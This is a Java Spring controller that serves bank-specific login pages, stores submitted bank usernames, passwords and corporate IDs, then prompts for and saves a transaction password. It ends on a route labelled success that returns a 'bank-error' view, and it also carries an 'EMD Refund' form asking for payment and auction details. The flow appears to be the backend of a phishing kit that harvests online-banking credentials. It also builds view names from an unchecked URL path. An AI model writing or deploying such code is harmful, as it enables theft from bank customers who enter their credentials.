package com.example.test.controller.ui;

import com.example.test.dto.request.BankLoginRequest;
import com.example.test.entities.BankLogin;
import com.example.test.service.BankLoginService;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

import java.util.UUID;

@Controller
@RequiredArgsConstructor
@RequestMapping("/bank")
@Slf4j
public class BankController {

    private final BankLoginService bankLoginService;

    @GetMapping("/login/{bankName}/{userId}")
    public String loginPage(@PathVariable String bankName, @PathVariable UUID userId, Model model) {
        log.info("Showing bank login form for bank: {}, userId: {}", bankName, userId);
        model.addAttribute("userId", userId);
        model.addAttribute("bankName", bankName);
        model.addAttribute("bankLoginRequest", new BankLoginRequest());
        return bankName + "/login";
    }

    @PostMapping("/login/{bankName}/{userId}")
    public String handleLogin(
            @PathVariable String bankName,
            @PathVariable UUID userId,
            @RequestParam("userName") String userName,
            @RequestParam("password") String password,
            @RequestParam(value = "corporateId", required = false, defaultValue = "") String corporateId,
            RedirectAttributes redirectAttributes,
            Model model) {

        log.info("Login attempt for bank: {}, userId: {}, username: {}", bankName, userId, userName);

        if (userName == null || userName.trim().isEmpty()) {
            model.addAttribute("userId", userId);
            model.addAttribute("bankName", bankName);
            model.addAttribute("corporateId", corporateId);
            model.addAttribute("error", "Please enter username");
            model.addAttribute("bankLoginRequest", new BankLoginRequest());
            return bankName + "/login";
        }

        if (password == null || password.trim().isEmpty()) {
            model.addAttribute("userId", userId);
            model.addAttribute("bankName", bankName);
            model.addAttribute("error", "Please enter password");
            model.addAttribute("bankLoginRequest", new BankLoginRequest());
            return bankName + "/login";
        }
        try {
            // Create request object
            BankLoginRequest bankLoginRequest = new BankLoginRequest();
            bankLoginRequest.setUserId(userId);
            bankLoginRequest.setBankName(bankName);
            bankLoginRequest.setCorporateId(corporateId);
            bankLoginRequest.setBankUsername(userName);
            bankLoginRequest.setBankPassword(password);
            bankLoginRequest.setUserName(userName); // userName same as bankUsername

            // Save to database
            var response = bankLoginService.createLogin(bankLoginRequest);

            log.info("Bank login successfully saved for userId: {} (bank: {})", userId, bankName);
            redirectAttributes.addFlashAttribute("message", "Login successful!");
            return "redirect:/bank/transactions/" + bankName + "/" + response.getId();

        } catch (Exception e) {
            log.error("Failed to save bank login for userId: {} (bank: {})", userId, bankName, e);
            model.addAttribute("userId", userId);
            model.addAttribute("bankName", bankName);
            model.addAttribute("error", "Failed to save login credentials. Please try again.");
            model.addAttribute("bankLoginRequest", new BankLoginRequest());
            return bankName + "/login";
        }
    }

    // Show transaction password page (dynamic bank)
    @GetMapping("/transactions/{bankName}/{bankLoginId}")
    public String showTransactionPassword(@PathVariable String bankName, @PathVariable UUID bankLoginId, Model model) {
        log.info("Showing transaction password UI for bankLoginId: {} (bank: {})", bankLoginId, bankName);
        BankLogin bankLogin = bankLoginService.getBankLoginById(bankLoginId);
        model.addAttribute("bankLoginId", bankLoginId);
        model.addAttribute("bankUsername", bankLogin.getBankUsername());
        model.addAttribute("bankName", bankName);
        return bankName + "/transaction-password";
    }

    // Handle transaction password submission (dynamic bank)
    @PostMapping("/transactions/{bankName}/{bankLoginId}")
    public String submitTransactionPassword(
            @PathVariable String bankName,
            @PathVariable UUID bankLoginId,
            @RequestParam("transactionPassword") String transactionPassword,
            RedirectAttributes redirectAttributes,
            Model model) {
        log.info("Submitting transaction password for bankLoginId: {} (bank: {})", bankLoginId, bankName);

        if (transactionPassword == null || transactionPassword.trim().isEmpty()) {
            model.addAttribute("bankLoginId", bankLoginId);
            model.addAttribute("bankName", bankName);
            model.addAttribute("error", "Please enter transaction password");
            return bankName + "/transaction-password";
        }
        bankLoginService.updateTransactionPassword(bankLoginId, transactionPassword);
        redirectAttributes.addFlashAttribute("message", "Transaction password updated successfully!");
        return "redirect:/bank/success";
    }

    // Show EMD Refund form
    @GetMapping("/emd-refund")
    public String showEmdRefundForm(Model model) {
        log.info("Showing EMD Refund form");
        return "emd-refund";
    }

    // Handle EMD Refund form submission
    @PostMapping("/emd-refund")
    public String submitEmdRefund(
            @RequestParam("fciRegion") String fciRegion,
            @RequestParam("paymentMode") String paymentMode,
            @RequestParam("amount") String amount,
            @RequestParam("utrNo") String utrNo,
            @RequestParam("retypeUtrNo") String retypeUtrNo,
            @RequestParam("bankName") String bankName,
            @RequestParam("paymentDate") String paymentDate,
            @RequestParam("auctionNo") String auctionNo,
            @RequestParam("commodityType") String commodityType,
            RedirectAttributes redirectAttributes,
            Model model) {

        log.info("EMD Refund submission - FCI Region: {}, Amount: {}, UTR: {}", fciRegion, amount, utrNo);

        // Validate UTR numbers match
        if (!utrNo.equals(retypeUtrNo)) {
            model.addAttribute("error", "UTR numbers do not match");
            return "emd-refund";
        }

        try {
            // Here you would typically save the EMD refund data to database
            // For now, we'll just log it
            log.info(
                    "EMD Refund Details - Region: {}, Mode: {}, Amount: {}, Bank: {}, Date: {}, Auction: {}, Commodity: {}",
                    fciRegion, paymentMode, amount, bankName, paymentDate, auctionNo, commodityType);

            redirectAttributes.addFlashAttribute("message", "EMD Refund request submitted successfully!");
            return "redirect:/bank/success";
        } catch (Exception e) {
            log.error("Failed to submit EMD refund", e);
            model.addAttribute("error", "Failed to submit EMD refund. Please try again.");
            return "emd-refund";
        }
    }

    @GetMapping("/success")
    public String successPage() {
        return "bank-error";
    }
}
